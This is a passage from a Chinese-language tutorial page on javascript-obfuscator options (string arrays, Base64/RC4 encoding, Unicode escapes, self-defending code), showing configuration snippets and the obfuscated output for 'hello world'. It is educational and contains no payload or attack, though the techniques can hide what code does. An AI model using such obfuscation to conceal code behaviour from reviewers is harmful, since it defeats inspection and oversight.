                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">var</span> _0x239a = [<span class="string">"getElementById"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x3f45a3, _0x583dfa</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x2cade2 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x28479a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x28479a) &#123;</span><br><span class="line">      _0x3f45a3[<span class="string">"push"</span>](_0x3f45a3[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x2cade2(++_0x583dfa);</span><br><span class="line">&#125;)(_0x239a, <span class="number">0xe1</span>);</span><br><span class="line"><span class="keyword">var</span> _0x3758 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x18659d, _0x50c21d</span>) </span>&#123;</span><br><span class="line">  _0x18659d = _0x18659d - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x531b8d = _0x239a[_0x18659d];</span><br><span class="line">  <span class="keyword">return</span> _0x531b8d;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> $ = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3d8723</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">document</span>[_0x3758(<span class="string">"0x0"</span>)](_0x3d8723);</span><br><span class="line">&#125;;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，最后还是有 <code>$</code> 的声明，其全局名称没有被改变。</p>
                  <h3 id="字符串混淆"><a href="#字符串混淆" class="headerlink" title="字符串混淆"></a>字符串混淆</h3>
                  <p>字符串混淆，即将一个字符串声明放到一个数组里面，使之无法被直接搜索到。我们可以通过控制 stringArray 参数来控制，默认为 true。</p>
                  <p>我们还可以通过 rotateStringArray 参数来控制数组化后结果的的元素顺序，默认为 true。还可以通过 stringArrayEncoding 参数来控制数组的编码形式，默认不开启编码，如果设置为 true 或 base64，则会使用 Base64 编码，如果设置为 rc4，则使用 RC4 编码。另外可以通过 stringArrayThreshold 来控制启用编码的概率，范围 0 到 1，默认 0.8。</p>
                  <p>示例如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">var a = 'hello world'   </span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  stringArray: <span class="literal">true</span>,</span><br><span class="line">  rotateStringArray: <span class="literal">true</span>,</span><br><span class="line">  stringArrayEncoding: <span class="literal">true</span>, <span class="comment">// 'base64' 或 'rc4' 或 false</span></span><br><span class="line">  stringArrayThreshold: <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">var</span> _0x4215 = [<span class="string">"aGVsbG8gd29ybGQ="</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x42bf17, _0x4c348f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x328832 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x355be1</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x355be1) &#123;</span><br><span class="line">      _0x42bf17[<span class="string">"push"</span>](_0x42bf17[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x328832(++_0x4c348f);</span><br><span class="line">&#125;)(_0x4215, <span class="number">0x1da</span>);</span><br><span class="line"><span class="keyword">var</span> _0x5191 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3cf2ba, _0x1917d8</span>) </span>&#123;</span><br><span class="line">  _0x3cf2ba = _0x3cf2ba - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x1f93f0 = _0x4215[_0x3cf2ba];</span><br><span class="line">  <span class="keyword">if</span> (_0x5191[<span class="string">"LqbVDH"</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> _0x5096b2;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> _0x282db1 = <span class="built_in">Function</span>(</span><br><span class="line">          <span class="string">"return\x20(function()\x20"</span> +</span><br><span class="line">            <span class="string">"&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)"</span> +</span><br><span class="line">            <span class="string">");"</span></span><br><span class="line">        );</span><br><span class="line">        _0x5096b2 = _0x282db1();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (_0x2acb9c) &#123;</span><br><span class="line">        _0x5096b2 = <span class="built_in">window</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">var</span> _0x388c14 =</span><br><span class="line">        <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="</span>;</span><br><span class="line">      _0x5096b2[<span class="string">"atob"</span>] ||</span><br><span class="line">        (_0x5096b2[<span class="string">"atob"</span>] = <span class="function"><span class="keyword">function</span> (<span class="params">_0x4cc27c</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> _0x2af4ae = <span class="built_in">String</span>(_0x4cc27c)[<span class="string">"replace"</span>](<span class="regexp">/=+$/</span>, <span class="string">""</span>);</span><br><span class="line">          <span class="keyword">for</span> (</span><br><span class="line">            <span class="keyword">var</span> _0x21400b = <span class="number">0x0</span>,</span><br><span class="line">              _0x3f4e2e,</span><br><span class="line">              _0x5b193b,</span><br><span class="line">              _0x233381 = <span class="number">0x0</span>,</span><br><span class="line">              _0x3dccf7 = <span class="string">""</span>;</span><br><span class="line">            (_0x5b193b = _0x2af4ae[<span class="string">"charAt"</span>](_0x233381++));</span><br><span class="line">            ~_0x5b193b &amp;&amp;</span><br><span class="line">            ((_0x3f4e2e =</span><br><span class="line">              _0x21400b % <span class="number">0x4</span> ? _0x3f4e2e * <span class="number">0x40</span> + _0x5b193b : _0x5b193b),</span><br><span class="line">            _0x21400b++ % <span class="number">0x4</span>)</span><br><span class="line">              ? (_0x3dccf7 += <span class="built_in">String</span>[<span class="string">"fromCharCode"</span>](</span><br><span class="line">                  <span class="number">0xff</span> &amp; (_0x3f4e2e &gt;&gt; ((<span class="number">-0x2</span> * _0x21400b) &amp; <span class="number">0x6</span>))</span><br><span class="line">                ))</span><br><span class="line">              : <span class="number">0x0</span></span><br><span class="line">          ) &#123;</span><br><span class="line">            _0x5b193b = _0x388c14[<span class="string">"indexOf"</span>](_0x5b193b);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> _0x3dccf7;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)();</span><br><span class="line">    _0x5191[<span class="string">"DuIurT"</span>] = <span class="function"><span class="keyword">function</span> (<span class="params">_0x51888e</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> _0x29801f = atob(_0x51888e);</span><br><span class="line">      <span class="keyword">var</span> _0x561e62 = [];</span><br><span class="line">      <span class="keyword">for</span> (</span><br><span class="line">        <span class="keyword">var</span> _0x5dd788 = <span class="number">0x0</span>, _0x1a8b73 = _0x29801f[<span class="string">"length"</span>];</span><br><span class="line">        _0x5dd788 &lt; _0x1a8b73;</span><br><span class="line">        _0x5dd788++</span><br><span class="line">      ) &#123;</span><br><span class="line">        _0x561e62 +=</span><br><span class="line">          <span class="string">"%"</span> +</span><br><span class="line">          (<span class="string">"00"</span> + _0x29801f[<span class="string">"charCodeAt"</span>](_0x5dd788)[<span class="string">"toString"</span>](<span class="number">0x10</span>))[</span><br><span class="line">            <span class="string">"slice"</span></span><br><span class="line">          ](<span class="number">-0x2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(_0x561e62);</span><br><span class="line">    &#125;;</span><br><span class="line">    _0x5191[<span class="string">"mgoBRd"</span>] = &#123;&#125;;</span><br><span class="line">    _0x5191[<span class="string">"LqbVDH"</span>] = !![];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> _0x1741f0 = _0x5191[<span class="string">"mgoBRd"</span>][_0x3cf2ba];</span><br><span class="line">  <span class="keyword">if</span> (_0x1741f0 === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    _0x1f93f0 = _0x5191[<span class="string">"DuIurT"</span>](_0x1f93f0);</span><br><span class="line">    _0x5191[<span class="string">"mgoBRd"</span>][_0x3cf2ba] = _0x1f93f0;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    _0x1f93f0 = _0x1741f0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> _0x1f93f0;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> a = _0x5191(<span class="string">"0x0"</span>);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到这里就把字符串进行了 Base64 编码，我们再也无法通过查找的方式找到字符串的位置了。</p>
                  <p>如果将 stringArray 设置为 false 的话，输出就是这样：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">var</span> a = <span class="string">"hello\x20world"</span>;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>字符串就仍然是明文显示的，没有被编码。</p>
                  <p>另外我们还可以使用 unicodeEscapeSequence 这个参数对字符串进行 Unicode 转码，使之更加难以辨认，示例如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">var a = 'hello world'</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  compact: <span class="literal">false</span>,</span><br><span class="line">  unicodeEscapeSequence: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">var</span> _0x5c0d = [<span class="string">"\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x54cc9c, _0x57a3b2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0xf833cf = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3cd8c6</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x3cd8c6) &#123;</span><br><span class="line">      _0x54cc9c[<span class="string">"push"</span>](_0x54cc9c[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0xf833cf(++_0x57a3b2);</span><br><span class="line">&#125;)(_0x5c0d, <span class="number">0x17d</span>);</span><br><span class="line"><span class="keyword">var</span> _0x28e8 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3fd645, _0x2cf5e7</span>) </span>&#123;</span><br><span class="line">  _0x3fd645 = _0x3fd645 - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x298a20 = _0x5c0d[_0x3fd645];</span><br><span class="line">  <span class="keyword">return</span> _0x298a20;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> a = _0x28e8(<span class="string">"0x0"</span>);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，这里字符串被数字化和 Unicode 化，非常难以辨认。</p>
                  <p>在很多 JavaScript 逆向的过程中，一些关键的字符串可能会作为切入点来查找加密入口。用了这种混淆之后，如果有人想通过全局搜索的方式搜索 hello 这样的字符串找加密入口，也没法搜到了。</p>
                  <h3 id="代码自我保护"><a href="#代码自我保护" class="headerlink" title="代码自我保护"></a>代码自我保护</h3>
                  <p>我们可以通过设置 selfDefending 参数来开启代码自我保护功能。开启之后，混淆后的 JavaScript 会以强制一行形式显示，如果我们将混淆后的代码进行格式化或者重命名，该段代码将无法执行。</p>
                  <p>示例如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">console.log('hello world')</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  selfDefending: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">var</span> _0x26da = [<span class="string">"log"</span>, <span class="string">"hello\x20world"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x190327, _0x57c2c0</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x577762 = <span class="function"><span class="keyword">function</span> (<span class="params">_0xc9dabb</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0xc9dabb) &#123;</span><br><span class="line">      _0x190327[<span class="string">"push"</span>](_0x190327[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> _0x35976e = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x16b3fe = &#123;</span><br><span class="line">      data: &#123; <span class="attr">key</span>: <span class="string">"cookie"</span>, <span class="attr">value</span>: <span class="string">"timeout"</span> &#125;,</span><br><span class="line">      setCookie: <span class="function"><span class="keyword">function</span> (<span class="params">_0x2d52d5, _0x16feda, _0x57cadf, _0x56056f</span>) </span>&#123;</span><br><span class="line">        _0x56056f = _0x56056f || &#123;&#125;;</span><br><span class="line">        <span class="keyword">var</span> _0x5b6dc3 = _0x16feda + <span class="string">"="</span> + _0x57cadf;</span><br><span class="line">        <span class="keyword">var</span> _0x333ced = <span class="number">0x0</span>;</span><br><span class="line">        <span class="keyword">for</span> (</span><br><span class="line">          <span class="keyword">var</span> _0x333ced = <span class="number">0x0</span>, _0x19ae36 = _0x2d52d5[<span class="string">"length"</span>];</span><br><span class="line">          _0x333ced &lt; _0x19ae36;</span><br><span class="line">          _0x333ced++</span><br><span class="line">        ) &#123;</span><br><span class="line">          <span class="keyword">var</span> _0x409587 = _0x2d52d5[_0x333ced];</span><br><span class="line">          _0x5b6dc3 += <span class="string">";\x20"</span> + _0x409587;</span><br><span class="line">          <span class="keyword">var</span> _0x4aa006 = _0x2d52d5[_0x409587];</span><br><span class="line">          _0x2d52d5[<span class="string">"push"</span>](_0x4aa006);</span><br><span class="line">          _0x19ae36 = _0x2d52d5[<span class="string">"length"</span>];</span><br><span class="line">          <span class="keyword">if</span> (_0x4aa006 !== !![]) &#123;</span><br><span class="line">            _0x5b6dc3 += <span class="string">"="</span> + _0x4aa006;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        _0x56056f[<span class="string">"cookie"</span>] = _0x5b6dc3;</span><br><span class="line">      &#125;,</span><br><span class="line">      removeCookie: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"dev"</span>;</span><br><span class="line">      &#125;,</span><br><span class="line">      getCookie: <span class="function"><span class="keyword">function</span> (<span class="params">_0x30c497, _0x51923d</span>) </span>&#123;</span><br><span class="line">        _0x30c497 =</span><br><span class="line">          _0x30c497 ||</span><br><span class="line">          <span class="function"><span class="keyword">function</span> (<span class="params">_0x4b7e18</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x4b7e18;</span><br><span class="line">          &#125;;</span><br><span class="line">        <span class="keyword">var</span> _0x557e06 = _0x30c497(</span><br><span class="line">          <span class="keyword">new</span> <span class="built_in">RegExp</span>(</span><br><span class="line">            <span class="string">"(?:^|;\x20)"</span> +</span><br><span class="line">              _0x51923d[<span class="string">"replace"</span>](<span class="regexp">/([.$?*|&#123;&#125;()[]\/+^])/g</span>, <span class="string">"$1"</span>) +</span><br><span class="line">              <span class="string">"=([^;]*)"</span></span><br><span class="line">          )</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">var</span> _0x817646 = <span class="function"><span class="keyword">function</span> (<span class="params">_0xf3fae7, _0x5d8208</span>) </span>&#123;</span><br><span class="line">          _0xf3fae7(++_0x5d8208);</span><br><span class="line">        &#125;;</span><br><span class="line">        _0x817646(_0x577762, _0x57c2c0);</span><br><span class="line">        <span class="keyword">return</span> _0x557e06 ? <span class="built_in">decodeURIComponent</span>(_0x557e06[<span class="number">0x1</span>]) : <span class="literal">undefined</span>;</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> _0x4673cd = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> _0x4c6c5c = <span class="keyword">new</span> <span class="built_in">RegExp</span>(</span><br><span class="line">        <span class="string">"\x5cw+\x20*\x5c(\x5c)\x20*&#123;\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*&#125;"</span></span><br><span class="line">      );</span><br><span class="line">      <span class="keyword">return</span> _0x4c6c5c[<span class="string">"test"</span>](_0x16b3fe[<span class="string">"removeCookie"</span>][<span class="string">"toString"</span>]());</span><br><span class="line">    &#125;;</span><br><span class="line">    _0x16b3fe[<span class="string">"updateCookie"</span>] = _0x4673cd;</span><br><span class="line">    <span class="keyword">var</span> _0x5baa80 = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">var</span> _0x1faf19 = _0x16b3fe[<span class="string">"updateCookie"</span>]();</span><br><span class="line">    <span class="keyword">if</span> (!_0x1faf19) &#123;</span><br><span class="line">      _0x16b3fe[<span class="string">"setCookie"</span>]([<span class="string">"*"</span>], <span class="string">"counter"</span>, <span class="number">0x1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (_0x1faf19) &#123;</span><br><span class="line">      _0x5baa80 = _0x16b3fe[<span class="string">"getCookie"</span>](<span class="literal">null</span>, <span class="string">"counter"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      _0x16b3fe[<span class="string">"removeCookie"</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x35976e();</span><br><span class="line">&#125;)(_0x26da, <span class="number">0x140</span>);</span><br><span class="line"><span class="keyword">var</span> _0x4391 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x1b42d8, _0x57edc8</span>) </span>&#123;</span><br><span class="line">  _0x1b42d8 = _0x1b42d8 - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x2fbeca = _0x26da[_0x1b42d8];</span><br><span class="line">  <span class="keyword">return</span> _0x2fbeca;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> _0x197926 = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x10598f = !![];</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">_0xffa3b3, _0x7a40f9</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x48e571 = _0x10598f</span><br><span class="line">      ? <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (_0x7a40f9) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x2194b5 = _0x7a40f9[<span class="string">"apply"</span>](_0xffa3b3, <span class="built_in">arguments</span>);</span><br><span class="line">            _0x7a40f9 = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">return</span> _0x2194b5;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      : <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">    _0x10598f = ![];</span><br><span class="line">    <span class="keyword">return</span> _0x48e571;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="keyword">var</span> _0x2c6fd7 = _0x197926(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x4828bb = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"\x64\x65\x76"</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    _0x35c3bc = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"\x77\x69\x6e\x64\x6f\x77"</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">var</span> _0x456070 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x4576a4 = <span class="keyword">new</span> <span class="built_in">RegExp</span>(</span><br><span class="line">      <span class="string">"\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> !_0x4576a4[<span class="string">"\x74\x65\x73\x74"</span>](</span><br><span class="line">      _0x4828bb[<span class="string">"\x74\x6f\x53\x74\x72\x69\x6e\x67"</span>]()</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> _0x3fde69 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0xabb6f4 = <span class="keyword">new</span> <span class="built_in">RegExp</span>(</span><br><span class="line">      <span class="string">"\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> _0xabb6f4[<span class="string">"\x74\x65\x73\x74"</span>](</span><br><span class="line">      _0x35c3bc[<span class="string">"\x74\x6f\x53\x74\x72\x69\x6e\x67"</span>]()</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> _0x2d9a50 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x58fdb4</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x2a6361 = ~<span class="number">-0x1</span> &gt;&gt; (<span class="number">0x1</span> + (<span class="number">0xff</span> % <span class="number">0x0</span>));</span><br><span class="line">    <span class="keyword">if</span> (_0x58fdb4[<span class="string">"\x69\x6e\x64\x65\x78\x4f\x66"</span>](<span class="string">"\x69"</span> === _0x2a6361)) &#123;</span><br><span class="line">      _0xc388c5(_0x58fdb4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> _0xc388c5 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x2073d6</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> 